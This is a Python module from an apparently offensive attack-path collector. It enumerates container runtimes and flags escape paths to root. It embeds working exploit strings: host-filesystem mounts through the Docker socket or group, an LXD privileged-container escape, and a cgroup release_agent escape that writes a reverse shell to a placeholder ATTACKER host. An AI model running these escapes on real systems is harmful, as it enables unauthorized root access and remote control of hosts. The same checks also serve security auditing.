#!/usr/bin/python3

# <@byt3n33dl3> from byt3n33dl3.github.io (AdverXarial).
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.

MODULE_NAME        = "brace"
MODULE_DESCRIPTION = "Container and cloud attack path collector"
MODULE_ROLE        = "ESCAPE"


def _cmd(collector, cmd):
    return collector.run(cmd)


def _line(collector, cmd):
    return collector.run_lines(cmd)


def _node(collector, nid, ntype, label, props):
    collector._add_node(nid, ntype, label, props)


def _edge(collector, src, etype, dst, risk="medium", props=None):
    collector._add_edge(src, etype, dst, risk=risk, properties=props or {})


def _find(collector, level, msg, raw=""):
    collector._add_finding(level, MODULE_NAME, msg, raw)


def run(collector):

    current_user = _cmd(collector, "whoami").strip()
    current_uid  = _cmd(collector, "id -u").strip()
    user_groups  = _cmd(collector, "groups 2>/dev/null").strip()

    cu_id = f"user:{current_user}"

    _node(collector, "user:root", "user", "root",
          {"uid": "0", "is_current": False, "is_root": True})


    docker_installed = _cmd(collector, "command -v docker && echo YES || echo NO").strip() == "YES"
    docker_version   = _cmd(collector, "docker --version 2>/dev/null | awk '{print $3}' | tr -d ','").strip()
    docker_running   = _cmd(collector, "pgrep dockerd > /dev/null 2>&1 && echo YES || echo NO").strip() == "YES"

    docker_socket = ""
    for sock in ["/var/run/docker.sock", "/run/docker.sock"]:
        check = _cmd(collector, f"[ -S '{sock}' ] && echo YES || echo NO").strip()
        if check == "YES":
            docker_socket = sock
            break

    socket_writable = False
    socket_perms    = ""
    socket_owner    = ""
    socket_group    = ""

    if docker_socket:
        socket_perms    = _cmd(collector, f"stat -c '%a' '{docker_socket}' 2>/dev/null").strip()
        socket_owner    = _cmd(collector, f"stat -c '%U' '{docker_socket}' 2>/dev/null").strip()
        socket_group    = _cmd(collector, f"stat -c '%G' '{docker_socket}' 2>/dev/null").strip()
        socket_writable = _cmd(collector, f"[ -w '{docker_socket}' ] && echo YES || echo NO").strip() == "YES"

    in_docker_group = "docker" in user_groups.split()

    _node(collector, "container:docker", "container", "Docker", {
        "installed":       docker_installed,
        "running":         docker_running,
        "version":         docker_version,
        "socket":          docker_socket,
        "socket_writable": socket_writable,
    })

    if in_docker_group:
        _node(collector, "group:docker", "group", "docker",
              {"privileged": True, "container_runtime": True})
        _edge(collector, cu_id, "MemberOf", "group:docker", risk="medium")

        if docker_installed and docker_running:
            exploit = "docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
            _edge(collector, "group:docker", "DockerGroupEscape", "user:root",
                  risk="critical",
                  props={"socket": docker_socket, "exploit_snippet": exploit,
                         "description": "Docker group membership allows container escape to root"})
            _find(collector, "CRITICAL",
                  f"Docker group membership: escape to root via host filesystem mount",
                  exploit)

    if socket_writable:
        exploit = f"docker -H unix://{docker_socket} run -v /:/mnt --rm -it alpine chroot /mnt sh"
        _edge(collector, cu_id, "DockerSocketWritable", "user:root",
              risk="critical",
              props={"socket": docker_socket, "permissions": socket_perms,
                     "exploit_snippet": exploit})
        _find(collector, "CRITICAL",
              f"Writable Docker socket: {docker_socket} (perms={socket_perms}, owner={socket_owner}:{socket_group})",
              exploit)


    if docker_installed and docker_running:

        container_lines = _line(collector,
            "docker ps -a --format '{{.ID}}|{{.Names}}|{{.Image}}|{{.Status}}' 2>/dev/null")

        for line in container_lines:
            parts = line.strip().split("|")
            if len(parts) < 2:
                continue
            cid, cname = parts[0], parts[1]
            if not cid:
                continue

            inspect = _cmd(collector, f"docker inspect {cid} 2>/dev/null")

            if '"Privileged": true' in inspect:
                nid = f"container:{cid}"
                _node(collector, nid, "container", f"privileged-{cname}", {
                    "privileged": True, "type": "docker", "container_id": cid})
                exploit = (f"docker exec -it {cid} sh -c 'mkdir /tmp/cgrp && "
                           f"mount -t cgroup -o rdma cgroup /tmp/cgrp && "
                           f"mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && "
                           f"echo /cmd > /tmp/cgrp/release_agent && "
                           f"echo \"#!/bin/sh\" > /cmd && "
                           f"echo \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\" >> /cmd && "
                           f"chmod a+x /cmd && echo 1 > /tmp/cgrp/x/cgroup.procs'")
                _edge(collector, nid, "PrivilegedContainerEscape", "user:root",
                      risk="critical",
                      props={"container_id": cid, "exploit_snippet": exploit})
                _find(collector, "CRITICAL",
                      f"Privileged container: {cname} ({cid}) - cgroup escape to root", exploit)

            if '"NetworkMode": "host"' in inspect:
                nid = f"container:hostnet-{cid}"
                _node(collector, nid, "container", f"hostnet-{cname}",
                      {"host_network": True, "type": "docker", "container_id": cid})
                _edge(collector, nid, "HostNetworkAccess", "user:root",
                      risk="high",
                      props={"container_id": cid,
                             "description": "Container has host network access"})
                _find(collector, "HIGH",
                      f"Host network container: {cname} ({cid})")

            if '"PidMode": "host"' in inspect:
                nid = f"container:hostpid-{cid}"
                _node(collector, nid, "container", f"hostpid-{cname}",
                      {"host_pid": True, "type": "docker", "container_id": cid})
                _edge(collector, nid, "HostPIDAccess", "user:root",
                      risk="high",
                      props={"container_id": cid,
                             "description": "Container can access host processes"})
                _find(collector, "HIGH",
                      f"Host PID namespace container: {cname} ({cid})")

            if "SYS_ADMIN" in inspect:
                nid = f"container:capsysadmin-{cid}"
                _node(collector, nid, "container", f"capsysadmin-{cname}",
                      {"cap_sys_admin": True, "type": "docker", "container_id": cid})
                _edge(collector, nid, "CapSysAdminEscape", "user:root",
                      risk="critical",
                      props={"container_id": cid, "capability": "SYS_ADMIN"})
                _find(collector, "CRITICAL",
                      f"CAP_SYS_ADMIN container: {cname} ({cid}) - privileged capability escape")

            if "/var/run/docker.sock" in inspect:
                nid = f"container:dockersock-{cid}"
                _node(collector, nid, "container", f"dockersock-{cname}",
                      {"docker_socket_mounted": True, "type": "docker", "container_id": cid})
                exploit = "docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh"
                _edge(collector, nid, "DockerSocketMountedEscape", "user:root",
                      risk="critical",
                      props={"container_id": cid, "socket": "/var/run/docker.sock",
                             "exploit_snippet": exploit})
                _find(collector, "CRITICAL",
                      f"Docker socket mounted inside container: {cname} ({cid})", exploit)


    in_lxd_group  = "lxd" in user_groups.split()
    lxd_installed = _cmd(collector, "command -v lxc && echo YES || echo NO").strip() == "YES"

    lxd_socket = ""
    for sock in ["/var/snap/lxd/common/lxd/unix.socket", "/var/lib/lxd/unix.socket"]:
        if _cmd(collector, f"[ -S '{sock}' ] && echo YES || echo NO").strip() == "YES":
            lxd_socket = sock
            break

    if in_lxd_group:
        _node(collector, "group:lxd", "group", "lxd",
              {"privileged": True, "container_runtime": True})
        _edge(collector, cu_id, "MemberOf", "group:lxd", risk="medium")

        if lxd_installed:
            exploit = ("lxc init ubuntu:18.04 privesc -c security.privileged=true && "
                       "lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true && "
                       "lxc start privesc && lxc exec privesc -- /bin/bash")
            _edge(collector, "group:lxd", "LXDGroupEscape", "user:root",
                  risk="critical",
                  props={"socket": lxd_socket, "exploit_snippet": exploit})
            _find(collector, "CRITICAL",
                  "LXD group membership: escape to root via privileged container image mount",
                  exploit)


    in_container   = False
    container_type = ""

    if _cmd(collector, "[ -f /.dockerenv ] && echo YES || echo NO").strip() == "YES":
        in_container   = True
        container_type = "docker"
    elif _cmd(collector, "grep -q docker /proc/1/cgroup 2>/dev/null && echo YES || echo NO").strip() == "YES":
        in_container   = True
        container_type = "docker"
    elif _cmd(collector, "grep -q lxc /proc/1/cgroup 2>/dev/null && echo YES || echo NO").strip() == "YES":
        in_container   = True
        container_type = "lxc"
    elif _cmd(collector, "grep -q kubepods /proc/1/cgroup 2>/dev/null && echo YES || echo NO").strip() == "YES":
        in_container   = True
        container_type = "kubernetes"

    if in_container:
        _find(collector, "HIGH",
              f"Running inside a {container_type} container - checking escape vectors")

        escape_techniques = []

        if _cmd(collector, "[ -e /dev/kmsg ] && echo YES || echo NO").strip() == "YES":
            escape_techniques.append("kmsg_device")

        if _cmd(collector, "mount 2>/dev/null | grep -q 'type cgroup' && echo YES || echo NO").strip() == "YES":
            escape_techniques.append("cgroup_mount")

        if _cmd(collector, "[ -S /var/run/docker.sock ] && echo YES || echo NO").strip() == "YES":
            escape_techniques.append("docker_socket_mounted")

        _node(collector, "container:current", "container", "current-container", {
            "type": container_type, "escape_techniques": escape_techniques})

        if "docker_socket_mounted" in escape_techniques:
            exploit = "docker -H unix:///var/run/docker.sock run -v /:/hostfs --rm -it alpine chroot /hostfs sh"
            _edge(collector, "container:current", "ContainerEscapeDockerSocket", "user:root",
                  risk="critical",
                  props={"technique": "docker_socket", "exploit_snippet": exploit})
            _find(collector, "CRITICAL",
                  "Docker socket accessible inside container - escape to host root possible", exploit)

        if "cgroup_mount" in escape_techniques:
            _edge(collector, "container:current", "ContainerEscapeCgroup", "user:root",
                  risk="critical",
                  props={"technique": "cgroup_mount"})
            _find(collector, "CRITICAL",
                  "Cgroup mount accessible inside container - escape via notify_on_release possible")


    podman_installed = _cmd(collector, "command -v podman && echo YES || echo NO").strip() == "YES"
    podman_running   = _cmd(collector, "pgrep podman > /dev/null 2>&1 && echo YES || echo NO").strip() == "YES"

    if podman_installed:
        _node(collector, "container:podman", "container", "Podman",
              {"installed": True, "running": podman_running, "rootless": True})
        _find(collector, "POTENTIAL",
              "Podman detected - check for rootless escape vectors and writable socket")


    kubectl_installed = _cmd(collector, "command -v kubectl && echo YES || echo NO").strip() == "YES"
    k8s_installed     = (_cmd(collector, "command -v kubelet && echo YES || echo NO").strip() == "YES"
                         or _cmd(collector, "command -v kubeadm && echo YES || echo NO").strip() == "YES")

    if kubectl_installed:
        _node(collector, "container:kubernetes", "container", "Kubernetes",
              {"installed": True, "kubectl": True})

        kubeconfig = _cmd(collector, "[ -f ~/.kube/config ] && echo YES || echo NO").strip()
        if kubeconfig == "YES":
            _edge(collector, cu_id, "KubeConfigAccess", "container:kubernetes",
                  risk="high",
                  props={"config": "~/.kube/config"})
            _find(collector, "HIGH",
                  "kubectl config found at ~/.kube/config - cluster access may be available")

        sa_token = _cmd(collector,
            "[ -f /var/run/secrets/kubernetes.io/serviceaccount/token ] && echo YES || echo NO").strip()
        if sa_token == "YES":
            _find(collector, "CRITICAL",
                  "Kubernetes service account token present at default path - API access possible",
                  "/var/run/secrets/kubernetes.io/serviceaccount/token")


    containerd_installed = (_cmd(collector, "command -v containerd && echo YES || echo NO").strip() == "YES"
                            or _cmd(collector, "command -v ctr && echo YES || echo NO").strip() == "YES")
    containerd_running   = _cmd(collector, "pgrep containerd > /dev/null 2>&1 && echo YES || echo NO").strip() == "YES"

    containerd_socket = ""
    for sock in ["/run/containerd/containerd.sock", "/var/run/containerd/containerd.sock"]:
        if _cmd(collector, f"[ -S '{sock}' ] && echo YES || echo NO").strip() == "YES":
            containerd_socket = sock
            break

    if containerd_installed:
        _node(collector, "container:containerd", "container", "containerd",
              {"installed": True, "running": containerd_running, "socket": containerd_socket})
        if containerd_socket:
            sock_writable = _cmd(collector,
                f"[ -w '{containerd_socket}' ] && echo YES || echo NO").strip() == "YES"
            if sock_writable:
                _find(collector, "CRITICAL",
                      f"Writable containerd socket: {containerd_socket} - container escape possible",
                      containerd_socket)


    daemon_config = _cmd(collector, "cat /etc/docker/daemon.json 2>/dev/null").strip()
    if daemon_config:
        if "insecure-registries" in daemon_config:
            _find(collector, "HIGH",
                  "Docker daemon configured with insecure registries", daemon_config)
        if '"live-restore"' not in daemon_config:
            _find(collector, "POTENTIAL",
                  "Docker daemon live-restore not configured")


    total_escapes = 0
    if in_docker_group and docker_installed and docker_running:
        total_escapes += 1
    if socket_writable:
        total_escapes += 1
    if in_lxd_group and lxd_installed:
        total_escapes += 1

    runtimes = []
    if docker_installed:
        runtimes.append("docker")
    if podman_installed:
        runtimes.append("podman")
    if lxd_installed:
        runtimes.append("lxd")
    if kubectl_installed:
        runtimes.append("kubernetes")
    if containerd_installed:
        runtimes.append("containerd")

    collector.log_ok(
        f"Container runtimes: {', '.join(runtimes) or 'none'}  |  "
        f"Escape paths: {total_escapes}  |  "
        f"Inside container: {container_type if in_container else 'no'}"
    )
